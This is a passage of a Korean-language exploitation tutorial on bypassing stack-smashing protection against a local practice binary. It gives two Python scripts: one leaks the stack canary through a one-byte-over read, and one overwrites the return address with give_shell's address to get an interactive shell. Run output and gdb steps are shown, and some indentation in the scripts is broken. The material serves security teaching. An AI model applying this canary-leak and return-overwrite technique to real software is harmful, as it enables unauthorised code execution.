Bypassing SSP - 1 :
    example6_leak.py는 스택 카나리의 값을 구하는 파이썬 스크립트입니다.
    ex) 
        #!/usr/bin/python
        '''
        example6_leak.py
        '''
        
        import struct
        import subprocess
        import os
        import pty
        
        def readline(fd):
            res = ''
            try:
                while True:
                ch = os.read(fd, 1)
                res += ch
                if ch == '\n':
                    return res
            except:
                raise
        
        def read(fd, n):
            return os.read(fd, n)
        
        def writeline(proc, data):
            try:
                proc.stdin.write(data + '\n')
                proc.stdin.flush()
            except:
                raise
        
        def write(proc, data):
            try:
                proc.stdin.write(data)
                proc.stdin.flush()
            except:
                raise
        
        def p32(val):
            return struct.pack("<I", val)
        
        def u32(data):
            return struct.unpack("<I", data)[0]
        
        out_r, out_w = pty.openpty()
        s = subprocess.Popen("./example6", stdin=subprocess.PIPE, stdout=out_w)
        
        print read(out_r, 10) 
        
        write(s, "A"*33)
        
        data = read(out_r, 1024)                    # printing until null byte (containing canary)
        print `"[+] data : " + data`
        canary = "\x00" + data.split("A"*33)[1][:3] # retrieving canary from data
        
        print "[+] CANARY : " + hex(u32(canary))

    example6_leak.py를 실행하여 스택 카나리의 값을 출력해 보도록 하겠습니다.
    ex)
        $ python example6_leak.py
        Input1 : 
        '[+] data : Your input : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAE\x8b\xa5'
        [+] CANARY : 0xa58b4500

    다음으로는 구한 스택 카나리 값을 이용해 main 함수의 2번째 read 함수에서 스택 버퍼 오버플로우를 익스플로잇할 수 있습니다.

    gdb를 이용해 give_shell 함수의 주소를 구한 후 리턴 주소를 give_shell 함수의 주소로 덮어 셸을 획득하여 보도록 하겠습니다.
    ex)
        (gdb) p give_shell
        $1 = {<text variable, no debug info>} 0x804854b <give_shell>
        (gdb) 

    example6.py 코드는 example6의 리턴 주소를 give_shell 함수의 주소인 0x804854b으로 바꾸어 셸을 획득하는 파이썬 스크립트입니다.
    ex)
        #!/usr/bin/python
        '''
        example6.py
        '''
        
        import struct
        import subprocess
        import os
        import pty
        import sys
        
        def readline(fd):
        res = ''
            try:
                while True:
                ch = os.read(fd, 1)
                res += ch
                if ch == '\n':
                    return res
            except:
                raise
        
        def read(fd, n):
            return os.read(fd, n)
        
        def writeline(proc, data):
            try:
                proc.stdin.write(data + '\n')
                proc.stdin.flush()
            except:
                raise
        
        def write(proc, data):
            try:
                proc.stdin.write(data)
                proc.stdin.flush()
            except:
                raise
        
        def p32(val):
            return struct.pack("<I", val)
        
        def u32(data):
            return struct.unpack("<I", data)[0]
        
        out_r, out_w = pty.openpty()
        s = subprocess.Popen("./example6", stdin=subprocess.PIPE, stdout=out_w)
        
        print read(out_r, 10) # "Input1 : "
        
        write(s, "A"*33)
        
        data = read(out_r, 1024)                    # printing until null byte (containing canary)
        print `"[+] data : " + data`
        canary = "\x00" + data.split("A"*33)[1][:3] # retrieving canary from data
        
        print "[+] CANARY : " + hex(u32(canary))
        
        print read(out_r, 10) # "Input2 : "
        giveshell = 0x804854b
        
        payload  = "A"*32 # filling buf
        payload += canary
        payload += "B"*4 # padding until return address
        payload += p32(giveshell)
        
        write(s, payload)
        
        print "[+] get shell"
        
        while True:
            cmd = raw_input("$ ")
            writeline(s, cmd)
            res = read(out_r, 102400)
            sys.stdout.write(res)

    example6.py를 실행하면 다음과 같이 셸이 획득되는 것을 확인할 수 있습니다.
    ex)
        $ python example6.py
        Input1 : 
        '[+] data : Your input : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x1b\xf2\x13'
        [+] CANARY : 0x13f21b00
        Input2 : 
        [+] get shell
        $ id
        uid=1001(theori) gid=1001(theori) groups=1001(theori)
        $


















